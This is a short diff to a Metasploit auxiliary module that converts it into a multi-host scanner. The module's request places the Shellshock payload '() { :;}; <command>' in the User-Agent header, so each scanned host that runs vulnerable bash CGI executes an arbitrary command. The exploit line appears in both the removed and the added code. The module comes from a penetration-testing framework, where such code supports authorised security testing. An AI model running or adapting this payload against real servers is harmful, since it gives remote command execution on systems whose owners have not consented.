@@ -8,6 +8,7 @@ require 'msf/core'
 class Metasploit4 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
@@ -37,19 +38,12 @@ class Metasploit4 < Msf::Auxiliary
     ], self.class)
   end
 
-  def run
-    begin
-      send_request_cgi(
-        'method' => 'GET',
-        'uri' => normalize_uri(target_uri.path),
-        'agent' => "() { :;}; #{datastore['CMD']}"
-      )
-    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout,
-           Rex::HostUnreachable => e
-      fail_with(Failure::Unreachable, e)
-    ensure
-      disconnect
-    end
+  def run_host(ip)
+    send_request_cgi(
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path),
+      'agent' => "() { :;}; #{datastore['CMD']}"
+    )
   end
 
 end
